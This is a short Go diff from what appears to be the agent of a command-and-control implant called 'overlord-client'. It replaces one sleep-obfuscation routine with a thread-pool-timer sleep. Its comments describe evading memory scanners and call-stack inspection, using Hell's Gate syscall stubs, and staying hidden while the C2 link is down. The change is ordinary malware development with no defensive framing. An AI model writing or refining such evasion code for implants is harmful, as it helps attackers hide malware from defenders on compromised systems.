@@ -9,10 +9,10 @@ import (
 	"overlord-client/cmd/agent/evasion"
 )
 
-// obfSleepDuration sleeps for d with PAGE_NOACCESS protection on the PE
-// header and private RWX stubs so memory scanners see no signatures at rest.
-// Only safe to call when no other goroutine is executing Hell's Gate stubs
-// (i.e. during the reconnect backoff when the C2 connection is down).
+// obfSleepDuration sleeps for d using the NT thread-pool timer so the
+// waiting call stack looks like a legitimate thread-pool worker instead of
+// ntdll!NtDelayExecution.  Falls back to SleepObfuscated on failure.
+// PAGE_NOACCESS / XOR-obfuscation / working-set trim are applied by both paths.
 func obfSleepDuration(d time.Duration) {
-	evasion.SleepObfuscated(d)
+	evasion.TpTimerSleep(d)
 }
